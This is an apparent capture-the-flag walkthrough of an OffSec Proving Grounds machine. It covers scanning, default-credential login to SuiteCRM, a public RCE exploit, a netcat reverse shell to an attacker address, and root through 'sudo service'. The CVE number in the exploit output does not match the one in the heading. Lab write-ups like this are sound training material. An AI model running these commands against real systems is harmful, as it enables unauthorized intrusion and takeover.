# Crane — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

SuiteCRM 7.12.3 with default creds → CVE-2021-45897 scheduled report RCE → reverse shell → sudo `service` → GTFOBins root.

---

## Enumeration

Full port scan:

```bash
sudo nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.242.146 -oN nmap.txt
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.9p1 Debian |
| 80 | HTTP | Apache httpd 2.4.38 (SuiteCRM) |
| 3306 | MySQL | MySQL (unauthorized) |
| 33060 | MySQLX | MySQL X Protocol |

Port 80 is running **SuiteCRM**. The login page redirects to `index.php?action=Login&module=Users`.

---

## Exploitation — CVE-2021-45897 (SuiteCRM RCE)

Trying `admin:admin` on the login page — works. The version is **SuiteCRM 7.12.3**.

Found an exploit for **CVE-2021-45897**:
- [https://github.com/manuelz120/CVE-2021-45897](https://github.com/manuelz120/CVE-2021-45897)

Let's test it first:

```bash
python3 exploit.py -h http://192.168.242.146 -u admin -p admin -P "which nc"
```

```
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
INFO:CVE-2022-23940:Succesfully created scheduled report with id 1418d720-c990-d0f4-d09f-666165dc81d2. Enjoy your command execution :)
```

The exploit works by creating a malicious **scheduled report** that executes our command. No visible output, but it confirms execution. Let's go for a reverse shell:

```bash
python3 exploit.py -h http://192.168.242.146 -u admin -p admin -P "nc 192.168.45.228 6969 -e /bin/sh"
```

Start a listener and we catch a shell.

---

## Privilege Escalation — Sudo Service

Checking sudo permissions:

```bash
sudo -l
```

We can run `service` as root with sudo. From [GTFOBins](https://gtfobins.github.io/gtfobins/service/):

```bash
sudo service ../../bin/sh
```

This abuses `service` to traverse the filesystem and spawn a shell as root. **Root.** 🎉

---

## Key Takeaways

- **SuiteCRM CVE-2021-45897** uses scheduled reports to achieve RCE — a clever abuse of built-in CRM functionality
- **`sudo service`** with unrestricted paths is exploitable via directory traversal — a one-liner root
- Default creds continue to be the gift that keeps on giving

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
